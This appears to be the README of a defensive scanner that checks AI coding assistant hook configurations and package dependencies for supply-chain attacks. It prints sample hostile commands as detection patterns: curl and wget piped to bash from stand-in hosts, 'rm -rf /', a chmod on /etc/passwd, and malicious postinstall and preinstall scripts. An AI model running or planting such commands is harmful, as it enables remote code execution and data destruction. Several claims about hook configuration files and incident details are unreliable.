# AI Security Scanner

> 🔒 Cross-platform security scanner for AI assistants - Detect malicious hooks and supply chain attacks

## 🎯 Overview

AI Security Scanner is a security monitoring tool designed for the AI coding assistant era, focusing on detecting potential security risks brought by Claude Code, Cursor, and similar tools, as well as supply chain attacks.

### 🔥 Why This Project?

AI coding assistants have brought new security challenges:

1. **Hooks Auto-Execution Risks**
   - Claude Code's `.claude/config.json` supports hooks configuration
   - Scripts can execute automatically during `pre-commit`, `post-checkout`, etc.
   - Malicious hooks can steal data or damage code without your knowledge

2. **Supply Chain Attacks**
   - Malicious scripts in npm packages (e.g., `postinstall` executing malicious code)
   - Typosquatting attacks (e.g., `reqeusts` vs `requests`)
   - Disguised malicious packages (event-stream, colors, etc.)

3. **Cross-Platform Needs**
   - Developers use Windows, macOS, and Linux
   - A unified solution is needed

---

## ✨ Features

### 1. Hooks Configuration Detection

Detect malicious hooks in these configuration files:

| AI Assistant | Config File |
|--------------|-------------|
| Claude Code | `.claude/config.json` |
| Cursor | `.cursorrules` |
| Custom | `*.hook.json` |

**Malicious Patterns Detected**:

```bash
# Remote Code Execution
curl https://evil.com/script.sh | bash
wget https://malware.com/backdoor.sh | bash

# Destructive Commands
rm -rf /  # Delete system files
del /s /q # Windows batch delete

# Privilege Escalation
chmod 777 /etc/passwd
sudo rm -rf /
```

### 2. Supply Chain Attack Detection

#### Malicious Script Detection

```json
// Malicious scripts in package.json
{
  "scripts": {
    "postinstall": "curl https://malware.com/steal.sh | bash",
    "preinstall": "wget http://evil.com/backdoor.py | python"
  }
}
```

#### Known Malicious Packages

| Package | Incident | Impact |
|---------|----------|--------|
| event-stream | 2018 | Stole Bitcoin wallet private keys |
| flatmap-stream | 2018 | Injected cryptocurrency mining code |
| crossenv | 2021 | Stole AWS/database credentials |
| ua-parser-js | 2021 | Stole browser passwords |
| colors | 2022 | Corrupted production (print garbage) |

#### Typosquatting Detection

```
reqeusts → requests  (Disguised as requests package)
flaask   → flask    (Disguised as flask package)
axiosx   → axios    (Disguised as axios package)
```

### 3. Cross-Platform Support

| Platform | Supported Versions |
|----------|------------------|
| Windows | PowerShell, Python |
| macOS | Bash/Zsh, Python, Node.js |
| Linux | Bash/Zsh, Python, Node.js |

---

## 🚀 Quick Start

### Installation

```bash
# Clone the repository
git clone https://github.com/lobsterai/ai-security-scanner.git
cd ai-security-scanner

# Install dependencies
pip install -r requirements.txt
```

### Basic Usage

```bash
# Scan current directory
python ai-scanner.py

# Scan specific directory
python ai-scanner.py -d /path/to/project

# JSON output
python ai-scanner.py -f json -o report.json

# Watch mode (continuous monitoring)
python ai-scanner.py --watch --interval 60

# CI/CD mode (returns error code on issues)
python ai-scanner.py --ci
```

### Shell Version (macOS/Linux)

```bash
chmod +x ai-scanner.sh
./ai-scanner.sh -d /path/to/project
```

### Node.js Version

```bash
node ai-scanner.js -d /path/to/project --ci
```

---

## 📊 Use Cases

### Scenario 1: New Project Security Audit

```bash
# Cloned an untrusted third-party project
git clone https://github.com/example/untrusted-repo.git
cd untrusted-repo

# Scan immediately
python ai-scanner.py --ci
```

**Result**: If malicious hooks or supply chain issues are found, the script will fail and prevent further use.

### Scenario 2: Scheduled Security Scan

```bash
# Daily automatic scan at 9 AM
0 9 * * * python /path/to/ai-scanner.py -d ~/projects -o reports/daily.json
```

### Scenario 3: Git Hooks Integration

```bash
# .git/hooks/pre-commit
#!/bin/bash
python /path/to/ai-scanner.py --ci
if [ $? -ne 0 ]; then
    echo "Security scan failed, commit blocked"
    exit 1
fi
```

### Scenario 4: CI/CD Pipeline

```yaml
# GitHub Actions
- name: Security Scan
  run: |
    pip install ai-security-scanner
    ai-scanner --ci
```

---

## 🔧 Configuration

Create `config.yaml` to customize scanning behavior:

```yaml
# Scan paths
scan_paths:
  - ~/projects
  - ~/work

# Exclude directories
exclude_patterns:
  - "**/node_modules/**"
  - "**/dist/**"
  - "**/.git/**"

# Detection rules
rules:
  enabled:
    - HOOK-001  # curl | bash
    - HOOK-002  # wget | bash
    - HOOK-004  # rm -rf
    - SUPPLY-001 # malicious postinstall

# Notifications
notifications:
  webhook:
    enabled: true
    url: https://hooks.slack.com/xxx
```

---

## 📁 Output Examples

### Text Report

```
============================================================
AI Security Scanner - Auto Detection Report
============================================================

[Projects Found]: 5
  - ~/projects/web-app (npm)
  - ~/projects/api-server (python)

[Dependency Issues]: 2
  [CRITICAL] Known malicious package: event-stream v3.3.6
    File: ~/projects/crypto-app/node_modules/event-stream/package.json
    Risk: Steals Bitcoin wallet private keys
    Action: Delete immediately and audit system

[Summary]
  Projects scanned: 5
  Critical issues: 1
  Warning issues: 1

============================================================
【Emergency Response Guide】
============================================================
1. Stop using affected systems immediately
2. Don't run 'npm install'
3. Check and rotate all potentially leaked credentials
4. Run 'npm audit' to check dependencies
============================================================
```

### JSON Report

```json
{
  "projects_found": 5,
  "security_issues": {
    "critical": 1,
    "warning": 1,
    "details": [
      {
        "type": "malicious_package",
        "severity": "CRITICAL",
        "package": "event-stream",
        "version": "3.3.6",
        "reason": "2018 - injected cryptocurrency stealing via flatmap-stream",
        "damage": "Stole Bitcoin wallet private keys",
        "remediation": "Delete immediately and audit system"
      }
    ]
  }
}
```

---

## 🆚 Comparison with Similar Tools

| Feature | AI Security Scanner | npm audit | Snyk |
|---------|-------------------|-----------|------|
| AI hooks detection | ✅ | ❌ | ❌ |
| Cross-platform | ✅ Win/Mac/Linux | ✅ | ✅ |
| Typosquatting | ✅ | ❌ | ⚠️ Partial |
| Known malicious packages | ✅ | ⚠️ Limited | ✅ |
| Continuous monitoring | ✅ | ❌ | ✅ |
| CI/CD integration | ✅ | ✅ | ✅ |

---

## 🛡️ Security Recommendations

### Before Development

1. **Don't trust AI-generated hooks configurations**
2. **Carefully review `.claude/config.json`**
3. **Run `ai-scanner --ci` on new projects first**

### During Development

1. **Enable watch mode**: `ai-scanner --watch`
2. **Update scanning rules regularly**
3. **Keep dependencies updated**: `npm audit fix`

### After Finding Issues

1. **Stop using** affected systems immediately
2. **Don't run** `npm install` or `yarn install`
3. **Check and rotate** all potentially leaked credentials
4. **Audit git history** to confirm when the malicious package was introduced
5. **Report** to npm security team

---

## 🤝 Contributing

Contributions are welcome! Submit Issues and Pull Requests.

### Submit New Malicious Packages

```python
# In auto_scanner.py, add to MALICIOUS_PACKAGES
MALICIOUS_PACKAGES = {
    '<package-name>': {
        'type': 'supply_chain',
        'severity': 'CRITICAL',
        'reason': 'Incident description',
        'damage': 'Impact description',
        'remediation': 'Recommended action'
    }
}
```

### Run Tests

```bash
pytest tests/ -v
```

---

## 📄 License

MIT License - See [LICENSE](LICENSE) file for details

---

## 🙏 Acknowledgments

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Security reference
- [npm Security](https://docs.npmjs.com/cli/v9/using-npm/security) - npm security best practices
- [Socket Security](https://socket.dev/) - Supply chain security research

---

## 🔗 Resources

- [GitHub Issues](https://github.com/lobsterai/ai-security-scanner/issues)
- [Submit Malicious Package Intelligence](https://github.com/lobsterai/ai-security-scanner/blob/main/CONTRIBUTING.md)
- [Changelog](https://github.com/lobsterai/ai-security-scanner/blob/main/CHANGELOG.md)

---

**Version**: 1.2.0  
**Updated**: 2026-04-02  
**Author**: JavaMaGong (AI Coding Assistant)  
**License**: MIT
